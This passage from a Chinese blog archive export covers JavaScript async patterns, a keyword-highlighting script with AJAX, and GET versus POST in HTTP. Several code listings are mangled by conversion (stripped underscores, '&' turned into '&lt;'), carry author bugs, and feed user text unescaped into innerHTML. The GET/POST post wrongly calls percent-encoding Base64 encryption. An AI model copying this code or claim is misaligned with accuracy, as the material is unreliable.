    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 你可能知道，Javascript语言的执行环境是“单线程”（single thread）。所谓”单线程”，就是指一次只能完成一件任务。如果有多个任务，就必须排队，前面一个任务完成，再执行后面一个任务，以此类推。这种模式的好处是实现起来比较简单，执行环境相对单纯；坏处是只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行。常见的浏览器无响应（假死），往往就是因为某一段Javascript代码长时间运行（比如死循环），导致整个页面卡在这个地方，其他任务无法执行。 为了解决这个问题，Javascript语言将任务的执行模式分成两种：同步（Synchronous）和异步（Asynchronous）。“同步模式”就是上一段的模式，后一个任务等待前一个任务结束，然后再执行，程序的执行顺序与任务的排列顺序是一致的、同步的；”异步模式”则完全不同，每一个任务有一个或多个回调函数（callback），前一个任务结束后，不是执行后一个任务，而是执行回调函数，后一个任务则是不等前一个任务结束就执行，所以程序的执行顺序与任务的排列顺序是不一致的、异步的。“异步模式”非常重要。在浏览器端，耗时很长的操作都应该异步执行，避免浏览器失去响应，最好的例子就是Ajax操作。在服务器端，”异步模式”甚至是唯一的模式，因为执行环境是单线程的，如果允许同步执行所有http请求，服务器性能会急剧下降，很快就会失去响应。本文总结了”异步模式”编程的4种方法，理解它们可以让你写出结构更合理、性能更出色、维护更方便的Javascript程序。 一、回调函数这是异步编程最基本的方法。假定有两个函数f1和f2，后者等待前者的执行结果。 12f1();f2(); 如果f1是一个很耗时的任务，可以考虑改写f1，把f2写成f1的回调函数。 123456function f1(callback)&#123; setTimeout(function () &#123; // f1的任务代码 callback(); &#125;, 1000);&#125; 执行代码就变成下面这样： 1f1(f2); //回调 采用这种方式，我们把同步操作变成了异步操作，f1不会堵塞程序运行，相当于先执行程序的主要逻辑，将耗时的操作推迟执行。回调函数的优点是简单、容易理解和部署，缺点是不利于代码的阅读和维护，各个部分之间高度耦合（Coupling），流程会很混乱，而且每个任务只能指定一个回调函数。 二、事件监听另一种思路是采用事件驱动模式。任务的执行不取决于代码的顺序，而取决于某个事件是否发生。还是以f1和f2为例。首先，为f1绑定一个事件（这里采用的jQuery的写法）。 1f1.on(&apos;done&apos;, f2); 上面这行代码的意思是，当f1发生done事件，就执行f2。然后，对f1进行改写： 123456function f1()&#123; setTimeout(function () &#123; // f1的任务代码 f1.trigger(&apos;done&apos;); &#125;, 1000);&#125; f1.trigger(‘done’)表示，执行完成后，立即触发done事件，从而开始执行f2。这种方法的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以”去耦合”（Decoupling），有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。 三、发布/订阅我们假定，存在一个”信号中心”，某个任务执行完成，就向信号中心”发布”（publish）一个信号，其他任务可以向信号中心”订阅”（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做”发布/订阅模式”（publish-subscribe pattern），又称”观察者模式”（observer pattern）。这个模式有多种实现，下面采用的是Ben Alman的Tiny Pub/Sub，这是jQuery的一个插件。首先，f2向”信号中心”jQuery订阅”done”信号。 1jQuery.subscribe(&quot;done&quot;, f2); 然后，f1进行如下改写： 123456function f1()&#123; setTimeout(function () &#123; // f1的任务代码 jQuery.publish(&quot;done&quot;); &#125;, 1000);&#125; jQuery.publish(“done”)的意思是，f1执行完成后，向”信号中心”jQuery发布”done”信号，从而引发f2的执行。此外，f2完成执行后，也可以取消订阅（unsubscribe）。 1jQuery.unsubscribe(&quot;done&quot;, f2); 这种方法的性质与”事件监听”类似，但是明显优于后者。因为我们可以通过查看”消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。 四、Promises对象Promises对象是CommonJS工作组提出的一种规范，目的是为异步编程提供统一接口。简单说，它的思想是，每一个异步任务返回一个Promise对象，该对象有一个then方法，允许指定回调函数。比如，f1的回调函数f2,可以写成： 1f1().then(f2); f1要进行如下改写（这里使用的是jQuery的实现）： 12345678function f1()&#123; var dfd = $.Deferred(); setTimeout(function () &#123; // f1的任务代码 dfd.resolve(); &#125;, 500); return dfd.promise;&#125; 这样写的优点在于，回调函数变成了链式写法，程序的流程可以看得很清楚，而且有一整套的配套方法，可以实现许多强大的功能。比如，指定多个回调函数： 1f1().then(f2).then(f3); 再比如，指定发生错误时的回调函数： 1f1().then(f2).fail(f3); 而且，它还有一个前面三种方法都没有的好处：如果一个任务已经完成，再添加回调函数，该回调函数会立即执行。所以，你不用担心是否错过了某个事件或信号。这种方法的缺点就是编写和理解，都相对比较难。 五、参考链接&nbsp;Asynchronous JS: Callbacks, Listeners, Control Flow Libs and Promises&nbsp;http://www.ruanyifeng.com/blog/2012/12/asynchronous＿javascript.html]]></content>
      <categories>
        <category>JavaScript</category>
        <category>剪贴板</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>异步编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript综合应用小案例（续）]]></title>
    <url>%2Fblog%2F2013%2F05%2F05%2F2013-05-05-cb-getKeywords-2%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 上一篇文章，弄了一个 取词&nbsp;和 标红 功能的小应用，但是存在一些bug，今天修修补补，顺便也把ajax部分补上了~ Demo地址：：http://qianduannotes.sinaapp.com/getKeyword/ 代码部分：var GetKeywords = { str: “”, limit: 11, keywords:[], url: “./tool.php”, //page id getId: function(){ this.id = this.(“wp”).getAttribute(“data-page”); }, init : function(){ var box = this.(“article”), _this = this; //获取已经存在的关键词 this.getAllKeyWord(); //获取页面ID this.getId(); //让rmKeyWord函数全局化 window.rmkeyWord = this.rmkeyWord; //取词事件 box.onmouseup = function(evt){ var evt = evt || window.event, target = evt.target || evt.srcElement; //如果鼠标是在button上弹起，则忽略 if(target.id == “btn”) return; GetKeywords.str = _this.getSelectionText(); if(_this.str.length == 0){ _this.removeBtn(); return; } if(this.(“btn”)) { _this.removeBtn(); if(GetKeywords.str == “”) return; _this.createBtn(evt); return; } _this.createBtn(evt); } var types = document.getElementsByTagName(“input”); for(var j = 0, len = types.length; j &lt; len; j++){ (function(j){ types[j].onchange = function(){ _this.sendData(j + 1, “change”); } })(j); } }, //工具函数 _: function(obj){ return document.getElementById(obj); }, //获取选中文本 getSelectionText: function(){ if(window.getSelection) { return window.getSelection().toString(); } else if(document.selection &amp;&amp; document.selection.createRange) { return document.selection.createRange().text; } return ‘’; }, //创建按钮 createBtn: function(evt){ var button = document.createElement(“div”), evt = evt || window.event, x = evt.pageX || evt.x, y = evt.pageY || evt.y, i, j, len, cssList = “”, this = this, csses = { “height” : “30px”, “line-height” : “30px”, “position”: “absolute”, “top”: y + 10 + “px”, “left”: x + 10 + “px”, “cursor”: “pointer”, “border”: “1px solid #000”, “background”: “#EEE”, “padding”: “2px 8px”, “border-radius”: “3px” }; for(i in csses){ if(csses.hasOwnProperty(i)){ cssList += i + “:” + csses[i] + “;”; } } button.style.cssText = cssList; button.innerHTML = “添加到关键词列表”; button.setAttribute(“id”, “btn”); this.(“article”).appendChild(button); button.onclick = function(){ if(_this.str.length &gt; _this.limit){ alert(“关键词长度最长为11，可以通过设置GetKeywords.limit来控制长度。”); _this.removeBtn(); return; } for(j = 0, len = GetKeywords.keywords.length; j &lt; len; j++){ if(GetKeywords.keywords[j] == _this.str){ alert(“已经存在该关键词了~”); _this.removeBtn(); return; } continue; } _this.sendData(_this.str); _this.keywords.push(_this.str); _this.setRed(_this.str); _this.addTo(); this.removeBtn(); }; }, //删除按钮 removeBtn: function(){ var btn = this.(“btn”); btn.parentNode.removeChild(btn); }, //加入到关键词里列表 addTo: function(){ var word = this.(“wordList”); word.innerHTML += “&lt;span&gt;&lt;font&gt;” + this.str + “&lt;/font&gt;&lt;a href=’#’ onclick=’rmkeyWord(this);’&gt;&lt;/a&gt;&lt;/span&gt;”; }, //关键词标红 setRed: function(str){ var content = this.(“article”), temp = ‘(‘ + str + ‘)’; reg = new RegExp(temp,’g’); content.innerHTML = content.innerHTML.replace(reg, “&lt;span style=’color:red;’&gt;$1&lt;/span&gt;”); }, //删除标红 rmRed: function(str){ var content = this.(“article”), temp = “(&lt;span[^&lt;]*” + str + “&lt;/span&gt;)”; reg = new RegExp(temp,’gi’); content.innerHTML = content.innerHTML.replace(reg, str); }, //获取已经存在的关键词（也可以用来获取所有关键词） getAllKeyWord: function (){ var spans = this.(“wordList”).getElementsByTagName(“span”), key = [], i = 0, len; for(len = spans.length; i &lt; len; i++){ var font = spans[i].getElementsByTagName(“font”)[0]; var temp = font.innerText || font.textContent; this.setRed(temp); key.push(temp); } this.keywords = key; }, //删除关键词 rmkeyWord: function (obj){ var target = obj.parentNode, word = obj.previousSibling.innerHTML, i = 0, len; res = GetKeywords.sendData(word, “del”); GetKeywords.rmRed(word); for(len = GetKeywords.keywords.length; i &lt; len; i++){ if(GetKeywords.keywords[i] == word){ GetKeywords.keywords.splice(i,i); } continue; } target.parentNode.removeChild(target); var evt = arguments.callee.caller.arguments[0]; try{ evt.preventDefault(); }catch(e){ window.event.returnValue = false; } }, //ajax sendData: function(data, action){ var xmlhttp, action = action || “add”, _this = this; if (window.XMLHttpRequest){ xmlhttp = new XMLHttpRequest(); }else{ xmlhttp = new ActiveXObject(“Microsoft.XMLHTTP”); } xmlhttp.open(“GET”, this.url + “?” + action + “=” + data + “&lt;id=” + this.id, true); xmlhttp.onreadystatechange = function(){ if (xmlhttp.readyState == 4 &amp;&amp; xmlhttp.status == 200){ _this.sendSuccess(xmlhttp.responseText); } } xmlhttp.send(); }, sendSuccess:function(data){ window.console &amp;&amp; window.console.log &amp;&amp; window.console.log(data); }}GetKeywords.init(); 一、ajax部分 12345678910111213141516171819202122sendData: function(data, action)&#123; var xmlhttp, action = action || &quot;add&quot;, _this = this; if (window.XMLHttpRequest)&#123; xmlhttp = new XMLHttpRequest(); &#125;else&#123; xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); &#125; xmlhttp.open(&quot;GET&quot;, this.url + &quot;?&quot; + action + &quot;=&quot; + data + &quot;&lt;id=&quot; + this.id, true); xmlhttp.onreadystatechange = function()&#123; if (xmlhttp.readyState == 4 &amp;&amp; xmlhttp.status == 200)&#123; _this.sendSuccess(xmlhttp.responseText); &#125; &#125; xmlhttp.send();&#125;,sendSuccess:function(data)&#123; window.console &amp;&amp; window.console.log &amp;&amp; window.console.log(data);&#125; 感觉这里真心就没什么好说的，因为这玩意儿涉及到数据的提交、删除、和更新，所以GET的状态也分为add、del、change。默认的提交状态是add，代码中已经标红。 二、删除关键词上次也说了这个部分，但是里边用到了一个splice，在这里稍微详细描述下。 12345678910111213141516171819202122rmkeyWord: function (obj)&#123; var target = obj.parentNode, word = obj.previousSibling.innerHTML, i = 0, len; res = GetKeywords.sendData(word, &quot;del&quot;); GetKeywords.rmRed(word); for(len = GetKeywords.keywords.length; i &lt; len; i++)&#123; if(GetKeywords.keywords[i] == word)&#123; GetKeywords.keywords.splice(i,i); //删除第i个元素 &#125; continue; &#125; target.parentNode.removeChild(target); var evt = arguments.callee.caller.arguments[0]; try&#123; evt.preventDefault(); &#125;catch(e)&#123; window.event.returnValue = false; &#125;&#125;, splice() 方法用于插入、删除或替换数组的元素。这个方法可删除从 index 处开始的零个或多个元素，并且用参数列表中声明的一个或多个值来替换那些被删除的元素。 1arrayObject.splice(index,howmany,element1,.....,elementX) 参数描述 index 必需。规定从何处添加/删除元素。该参数是开始插入和（或）删除的数组元素的下标，必须是数字。howmany必需。规定应该删除多少元素。必须是数字，但可以是 “0”。如果未规定此参数，则删除从 index 开始到原数组结尾的所有元素。element1可选。规定要添加到数组的新元素。从 index 所指的下标处开始插入。elementX可选。可向数组添加若干元素。1）插入 1ArrayObj.splice(2, 0, &quot;addObj&quot;); 即为在数组第三个位置插入一个名为\addObj”的字符串。 2）删除 1ArrayObj.splice(2, 2); 即为删除从第三个开始的连续两个数组元素。 3）插入 1ArrayObj.splice(2, 1，&quot;replaceObj&quot;); 即为替换第三个元素（也可以说是删除从第三个元素开始的连续一个元素，然后添加一个名为\replaceObj”的字符串）。 来一个综合应用的： 1ArrayObj.splice(2, 2，&quot;replaceObj_1&quot;，&quot;replaceObj_2&quot;); &nbsp;即为删除从第三个元素开始的连续两个元素，然后在刚才删除的位置，添加名为\replaceObj_1”，\replaceObj_2”的两个字符串。相信应该已经比较清楚了吧~O(&cap;_&cap;)O~注：splice() 方法与 slice() 方法的作用是不同的，splice() 方法会直接对数组进行修改。 三、遇到的问题1. this指定的对象对象方法中this并不一定指向对象本身，即使写了 123456f: function()&#123; var _this = this; //然后在闭包中使用_this function name()&#123; _this.doSomething();//这是的_this也不一定是对象本身 &#125;&#125; 这是_this也不一定是指向该对象，[object global]，有可能指向的是这个对象~ 2. event的兼容性相信evt = evt || window.event，大家都明白，但是在FF下： 1234function test(evt)&#123; var evt = evt || window.event; //...&#125; 在调用test()的时候，如果没有加参数，evt为undefined，使用过程需要test(evt);当然也可以这样: 1234function test()&#123; var evt = argument.callee.caller.argument[0]; //...&#125; 4. for-in的问题 123for(i in csses)&#123; if(csses.hasOwnProperty(i))&#123; cssList += i + &quot;:&quot; + csses[i] + &quot;;&quot;; //button.style[i] = csses[i]; &#125; &#125; button.style.cssText = cssList; 开始的时候，我用的是注释里的方法button.style[i] = csses[i]，但在IE下报错了，后来就用的上面方式实现，具体为什么我也不知道。。 5. 标签解析的问题IE载入DOM之后，会把所有的标签解析成大写的，这个至少在IE7和8是如此，IE9以上没测试，就不知道了~ 6. JS一些常见的浏览器兼容问题这里提到的有：evt || window.eventevt.target || evt.srcElementevt.x || evt.pageX || evt.layerXevt.preventDefault() Vs window.event.returnValue = falseXMLHttpRequest ||&nbsp;ActiveXObject(“Microsoft.XMLHTTP”)obj.innerText || obj.textContentwindow.getSelection || document.selection四、参考W3School splice五、结语我认为，对象里的数据，能单独提取出来尽量单独提出来，不要把所有的常量都当做字面量放置在有需求的地方，用一个变量缓存的话，修改起来也十分方便。对象里的方法，能分离的分离，尽量不要一个嵌套着一个，搞不好就是一个泄露内存的闭包，分离出来，作为对象的直接方法，既可以方便多次利用，又不至于搞的太复杂。好吧，要学的东西真的很多很多，但是只要把看到的不明白弄明白，然后准备好下一个不明白到来，这样就行了。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈HTTP中Get与Post的区别]]></title>
    <url>%2Fblog%2F2013%2F05%2F05%2F2013-05-05-cb-get-and-post%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. Http定义了与服务器交互的不同方法，最基本的方法有4种，分别是GET，POST，PUT，DELETE。URL全称是资源描述符，我们可以这样认为：一个URL地址，它用于描述一个网络上的资源，而HTTP中的GET，POST，PUT，DELETE就对应着对这个资源的查，改，增，删4个操作。到这里，大家应该有个大概的了解了，GET一般用于获取/查询资源信息，而POST一般用于更新资源信息。 1.根据HTTP规范，GET用于信息获取，而且应该是安全的和幂等的。 (1).所谓安全的意味着该操作用于获取信息而非修改信息。换句话说，GET 请求一般不应产生副作用。就是说，它仅仅是获取资源信息，就像数据库查询一样，不会修改，增加数据，不会影响资源的状态。 &nbsp;注意：这里安全的含义仅仅是指是非修改信息。 (2).幂等的意味着对同一URL的多个请求应该返回同样的结果。这里我再解释一下幂等这个概念： 幂等（idempotent、idempotence）是一个数学或计算机学概念，常见于抽象代数中。 幂等有一下几种定义： 对于单目运算，如果一个运算对于在范围内的所有的一个数多次进行该运算所得的结果和进行一次该运算所得的结果是一样的，那么我们就称该运算是幂等的。比如绝对值运算就是一个例子，在实数集中，有abs(a)=abs(abs(a))。 对于双目运算，则要求当参与运算的两个值是等值的情况下，如果满足运算结果与参与运算的两个值相等，则称该运算幂等，如求两个数的最大值的函数，有在在实数集中幂等，即max(x,x)&amp;nbsp;=&amp;nbsp;x。 看完上述解释后，应该可以理解GET幂等的含义了。 但在实际应用中，以上2条规定并没有这么严格。引用别人文章的例子：比如，新闻站点的头版不断更新。虽然第二次请求会返回不同的一批新闻，该操作仍然被认为是安全的和幂等的，因为它总是返回当前的新闻。从根本上说，如果目标是当用户打开一个链接时，他可以确信从自身的角度来看没有改变资源即可。 2.根据HTTP规范，POST表示可能修改变服务器上的资源的请求。继续引用上面的例子：还是新闻以网站为例，读者对新闻发表自己的评论应该通过POST实现，因为在评论提交后站点的资源已经不同了，或者说资源被修改了。 上面大概说了一下HTTP规范中GET和POST的一些原理性的问题。但在实际的做的时候，很多人却没有按照HTTP规范去做，导致这个问题的原因有很多，比如说： 1.很多人贪方便，更新资源时用了GET，因为用POST必须要到FORM（表单），这样会麻烦一点。 2.对资源的增，删，改，查操作，其实都可以通过GET/POST完成，不需要用到PUT和DELETE。 3.另外一个是，早期的Web MVC框架设计者们并没有有意识地将URL当作抽象的资源来看待和设计，所以导致一个比较严重的问题是传统的Web MVC框架基本上都只支持GET和POST两种HTTP方法，而不支持PUT和DELETE方法。&nbsp; 简单解释一下MVC：MVC本来是存在于Desktop程序中的，M是指数据模型，V是指用户界面，C则是控制器。使用MVC的目的是将M和V的实现代码分离，从而使同一个程序可以使用不同的表现形式。 以上3点典型地描述了老一套的风格（没有严格遵守HTTP规范），随着架构的发展，现在出现REST(Representational State Transfer)，一套支持HTTP规范的新风格，这里不多说了，可以参考《RESTful Web Services》。 说完原理性的问题，我们再从表面现像上面看看GET和POST的区别： 1.GET请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，参数之间以&lt;相连，如：login.action?name=hyddd&lt;password=idontknow&lt;verify=%E4%BD%A0%E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如：%E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。 POST把提交的数据则放置在是HTTP包的包体中。 2.”GET方式提交的数据最多只能是1024字节，理论上POST没有限制，可传较大量的数据，IIS4中最大为80KB，IIS5中为100KB”？？！ 以上这句是我从其他文章转过来的，其实这样说是错误的，不准确的： (1).首先是”GET方式提交的数据最多只能是1024字节”，因为GET是通过URL提交数据，那么GET可提交的数据量就跟URL的长度有直接关系了。而实际上，URL不存在参数上限的问题，HTTP协议规范没有对URL长度进行限制。这个限制是特定的浏览器及服务器对它的限制。IE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系统的支持。 注意这是限制是整个URL长度，而不仅仅是你的参数值数据长度。[见参考资料5] (2).理论上讲，POST是没有大小限制的，HTTP协议规范也没有进行大小限制，说\POST数据量存在80K/100K的大小限制”是不准确的，POST数据是没有限制的，起限制作用的是服务器的处理程序的处理能力。 对于ASP程序，Request对象处理每个表单域时存在100K的数据长度限制。但如果使用Request.BinaryRead则没有这个限制。 由这个延伸出去，对于IIS 6.0，微软出于安全考虑，加大了限制。我们还需要注意： 1).IIS 6.0默认ASP POST数据量最大为200KB，每个表单域限制是100KB。 2).IIS 6.0默认上传文件的最大大小是4MB。 3).IIS 6.0默认最大请求头是16KB。 IIS 6.0之前没有这些限制。[见参考资料5] 所以上面的80K，100K可能只是默认值而已(注：关于IIS4和IIS5的参数，我还没有确认)，但肯定是可以自己设置的。由于每个版本的IIS对这些参数的默认值都不一样，具体请参考相关的IIS配置文档。 3.在ASP中，服务端获取GET请求参数用Request.QueryString，获取POST请求参数用Request.Form。在JSP中，用request.getParameter(\”XXXX\”)来获取，虽然jsp中也有request.getQueryString()方法，但使用起来比较麻烦，比如：传一个test.jsp?name=hyddd&lt;password=hyddd，用request.getQueryString()得到的是：name=hyddd&lt;password=hyddd。在PHP中，可以用$_GET和$_POST分别获取GET和POST中的数据，而$_REQUEST则可以获取GET和POST两种请求中的数据。值得注意的是，JSP中使用request和PHP中使用$_REQUEST都会有隐患，这个下次再写个文章总结。 4.POST的安全性要比GET的安全性高。注意：这里所说的安全性和上面GET提到的\安全”不是同个概念。上面\安全”的含义仅仅是不作数据修改，而这里安全的含义是真正的Security的含义，比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存，(2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击。 总结一下，Get是向服务器发索取数据的一种请求，而Post是向服务器提交数据的一种请求，在FORM（表单）中，Method默认为”GET”，实质上，GET和POST只是发送机制不同，并不是一个取一个发！ 参考资料：[1].http://hi.baidu.com/liuzd003/blog/item/7bfecbfa6ea94ed8b58f318c.html[2].http://www.blogjava.net/onlykeke/archive/2006/08/23/65285.aspx[3].http://baike.baidu.com/view/2067025.htm[4].http://www.chxwei.com/article.asp?id=373[5].http://blog.csdn.net/somat/archive/2004/10/29/158707.aspx 本文转自：hyddd]]></content>
      <categories>
        <category>网络交互</category>
        <category>剪贴板</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript综合应用小案例]]></title>
    <url>%2Fblog%2F2013%2F05%2F04%2F2013-05-04-cb-getkeywords%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 按需求弄了一个 取词 以及 标红 的小应用。先上demo ：http://qianduannotes.sinaapp.com/getKeyword/很多平时常用的东西，都用上了，所以拿出来说说。 一、代码var GetKeywords = { str: “”, limit: 11, keywords:[], init : function(){ var box = this._(“article”), _this = this; //获取已经存在的关键词 this.getAllKeyWord(); //让rmKeyWord函数全局化 window.rmkeyWord = this.rmkeyWord; //取词事件 box.onmouseup = function(evt){ var evt = evt || window.event, target = evt.target || evt.srcElement; //如果鼠标是在button上弹起，则忽略 if(target.id == “btn”) return; GetKeywords.str = _this.getSelectionText(); if(_this.str.length == 0) return; if(this.(“btn”)) { _this.removeBtn(); if(GetKeywords.str == “”) return; _this.createBtn(evt); return; } _this.createBtn(evt); } }, //工具函数 _: function(obj){ return document.getElementById(obj); }, //获取选中文本 getSelectionText: function(){ if(window.getSelection) { return window.getSelection().toString(); } else if(document.selection &amp;&amp; document.selection.createRange) { return document.selection.createRange().text; } return ‘’; }, //创建按钮 createBtn: function(evt){ var button = document.createElement(“div”), evt = evt || window.event, x = evt.pageX || evt.x, y = evt.pageY || evt.y, i, j, len, cssList = “”, this = this, csses = { “height” : “30px”, “line-height” : “30px”, “position”: “absolute”, “top”: y + 10 + “px”, “left”: x + 10 + “px”, “cursor”: “pointer”, “border”: “1px solid #000”, “background”: “#EEE”, “padding”: “2px 8px”, “border-radius”: “3px” }; for(i in csses){ if(csses.hasOwnProperty(i)){ cssList += i + “:” + csses[i] + “;”; } } button.style.cssText = cssList; button.innerHTML = “添加到关键词列表”; button.setAttribute(“id”, “btn”); this.(“article”).appendChild(button); button.onclick = function(){ if(_this.str.length &gt; _this.limit){ alert(“关键词长度最长为11，可以通过设置GetKeywords.limit来控制长度。”); _this.removeBtn(); return; } for(j = 0, len = GetKeywords.keywords.length; j &lt; len; j++){ if(GetKeywords.keywords[j] == _this.str){ alert(“已经存在该关键词了~”); _this.removeBtn(); return; } continue; } _this.keywords.push(_this.str); _this.setRed(_this.str); _this.addTo(); this.removeBtn(); }; }, //删除按钮 removeBtn: function(){ var btn = this.(“btn”); btn.parentNode.removeChild(btn); }, //加入到关键词里列表 addTo: function(){ var word = this.(“wordList”); word.innerHTML += “&lt;span&gt;&lt;font&gt;” + this.str + “&lt;/font&gt;&lt;a href=’#’ onclick=’rmkeyWord(this);’&gt;&lt;/a&gt;&lt;/span&gt;”; }, //关键词标红 setRed: function(str){ var content = this.(“article”), temp = ‘(‘ + str + ‘)’; reg = new RegExp(temp,’g’); content.innerHTML = content.innerHTML.replace(reg, “&lt;span style=’color:red;’&gt;$1&lt;/span&gt;”); }, //删除标红 rmRed: function(str){ var content = this.(“article”), temp = “(&lt;span[^&lt;]*” + str + “&lt;/span&gt;)”; reg = new RegExp(temp,’gi’); content.innerHTML = content.innerHTML.replace(reg, str); }, //获取已经存在的关键词（也可以用来获取所有关键词） getAllKeyWord: function (){ var spans = this.(“wordList”).getElementsByTagName(“span”), key = [], i = 0, len; for(len = spans.length; i &lt; len; i++){ var font = spans[i].getElementsByTagName(“font”)[0]; var temp = font.innerText || font.textContent; this.setRed(temp); key.push(temp); } this.keywords = key; }, //删除关键词 rmkeyWord: function (obj){ var target = obj.parentNode, word = obj.previousSibling.innerHTML, i = 0, len; GetKeywords.rmRed(word); for(len = GetKeywords.keywords.length; i &lt; len; i++){ if(GetKeywords.keywords[i] == word){ GetKeywords.keywords.splice(i,i); } continue; } target.parentNode.removeChild(target); return; }}GetKeywords.init();以上是所有js代码，比较长，下面将列举一些比较突出的点（望高人多多指点）。 二、代码分析1.获取文本 12345678getSelectionText: function()&#123; if(window.getSelection) &#123; return window.getSelection().toString(); &#125; else if(document.selection &amp;&amp; document.selection.createRange) &#123; return document.selection.createRange().text; &#125; return &apos;&apos;;&#125; 这个在以前（JavaScript操控光标，你会么？）的文章里也说过，就不赘述了。 2.创建控制框 12345678910111213141516171819202122232425createBtn: function(evt)&#123; var button = document.createElement(&quot;div&quot;), //... csses = &#123; &quot;height&quot; : &quot;30px&quot;, &quot;line-height&quot; : &quot;30px&quot;, &quot;position&quot;: &quot;absolute&quot;, &quot;top&quot;: y + 10 + &quot;px&quot;, &quot;left&quot;: x + 10 + &quot;px&quot;, &quot;cursor&quot;: &quot;pointer&quot;, &quot;border&quot;: &quot;1px solid #000&quot;, &quot;background&quot;: &quot;#EEE&quot;, &quot;padding&quot;: &quot;2px 8px&quot;, &quot;border-radius&quot;: &quot;3px&quot; &#125;; for(i in csses)&#123; if(csses.hasOwnProperty(i))&#123; cssList += i + &quot;:&quot; + csses[i] + &quot;;&quot;; &#125; &#125; button.style.cssText = cssList; button.innerHTML = &quot;添加到关键词列表&quot;; button.setAttribute(&quot;id&quot;, &quot;btn&quot;); //...&#125; 这里有一点我想说说，在写js的时候，会经常涉及到对DOM对象style的处理，如果不想额外加入一个plugins.css之类的文件，可以像上面一样，将样式放置在一个对象中，然后利用for in将其写入，本来开始我用的是 1obj.style[i] = csses[i]; 不知道为什么，在IE下报错了，后来便用cssText代替。效果： 3.标红 12345678//关键词标红setRed: function(str)&#123; var content = this._(&quot;article&quot;), temp = &apos;(&apos; + str + &apos;)&apos;; reg = new RegExp(temp,&apos;g&apos;); content.innerHTML = content.innerHTML.replace(reg, &quot;&lt;span&gt;$1&lt;/span&gt;&quot;);&#125; 这里主要就是正则表达式的事情了，正则的话，推荐两篇文章一篇是司徒正美的，讲的比较全面，比较系统。点我链接过去→一篇是30分钟搞定正则，这个讲说是对所有语言，JS的话正则这一块还不是特别完善和强大。点我链接过去→哈哈，相信用过正则的人不需要我来解释这个$1了吧，他的意思就是匹配到的第一个。当然，删除标红和这个原理是差不多的。 12345678//删除标红rmRed: function(str)&#123; var content = this._(&quot;article&quot;), temp = &quot;(&lt;span[^&lt;]*&quot; +=&quot;&quot; str=&quot;&quot; &quot;&lt;=&quot;&quot; span=&quot;&quot;&gt;)&quot;; reg = new RegExp(temp,&apos;gi&apos;); content.innerHTML = content.innerHTML.replace(reg, str);&#125; &lt;/span[^&lt;]*”&gt; 这里是写完这篇blog才发现的一个bug， IE下如果rmRed中的正则是’g’,貌似该函数会无效，在IE8控制台下查看，NND，输出innerHTML中的标签全部变成大写了，无奈，只好改成’gi’。 4.获取所有关键词和删除关键词 1234567891011121314151617//获取已经存在的关键词（也可以用来获取所有关键词）getAllKeyWord: function ()&#123; //...&#125;,//删除关键词rmkeyWord: function (obj)&#123; //... GetKeywords.rmRed(word); for(len = GetKeywords.keywords.length; i &lt; len; i++)&#123; if(GetKeywords.keywords[i] == word)&#123; GetKeywords.keywords.splice(i,i); &#125; continue; &#125; //...&#125; 这个地方，有一个疑问，在调用的时候，使用this.keywords没反应，但是改成GetKeywords就行了，还没研究具体原因是什么~ 5.初始化 1GetKeywords.init(); init()为总入口，进去之后，先获取已经存在的关键词，然后标红，接着绑定onmouseup事件。 三、然后当然咯，这个案例的ajax部分还没写，弄完之后还得给后台送过去。。好吧，明天接着弄吧。写这玩意儿还是花了点功夫，不过鄙人写代码的水平还在初级阶段，望大神们不要吐槽，多提宝贵意见，谢谢！然后，还是那个demo，http://qianduannotes.sinaapp.com/getKeyword/顺便，推广下，团队做的一个网站，主要技术是爬虫，高峰期PV稳定在120W以上，找工作的童鞋可以多去踩踩~宣讲会查询系统&mdash;&mdash;海投网&nbsp; P.S：刚让队友测试，还是发现了不少bug，果然考虑问题还是不全面啊~还要继续加油。。。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[腾讯的三轮面试（web前端）]]></title>
    <url>%2Fblog%2F2013%2F04%2F27%2F2013-04-27-cb-mianshi%2F</url>
